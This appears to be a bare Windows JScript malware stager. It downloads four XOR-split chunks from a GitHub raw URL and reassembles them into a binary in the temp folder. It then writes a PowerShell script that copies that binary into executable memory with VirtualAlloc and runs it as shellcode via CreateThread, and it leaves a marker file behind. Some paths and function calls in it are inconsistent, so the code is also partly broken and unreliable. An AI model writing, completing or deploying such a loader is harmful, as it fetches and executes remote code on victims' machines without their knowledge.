var x=new ActiveXObject("MSXML2.XMLHTTP");
var fso=new ActiveXObject("Scripting.FileSystemObject");
var b=[];for(var i=0;i<4;i++){x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/c"+i,0);x.send();b.push(x.responseBody);}
var xr=[];var l=b[0].length;for(var k=0;k<l;k++){var v=b[0][k];for(var j=1;j<4;j++){v^=b[j][k]};xr.push(v)}
var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();
for(var m=16;m<xr.length;m++)s.WriteByte(xr[m]&0xFF);
var t=fso.GetSpecialFolder(2)+"\\dec.bin";s.SaveToFile(t,2);s.Close();
var y=fso.CreateTextFile(t+"\\r.ps1");y.Write("$b=[IO.File]::ReadAllBytes('C:\\temp\\dec.bin');$va=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress(GetModuleHandle('kernel32'),'VirtualAlloc')),[Type]([Func[IntPtr,Int32,Int32,Int32,IntPtr]]));$p=$va.Invoke(0,$b.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress(GetModuleHandle('kernel32'),'CreateThread')),[Type]([Func[IntPtr,Int32,IntPtr,IntPtr,Int32,IntPtr]])).Invoke(0,0,$p,0,0,0);");y.Close();
fso.CreateTextFile("C:\\temp\\k8.txt").Write("OK");
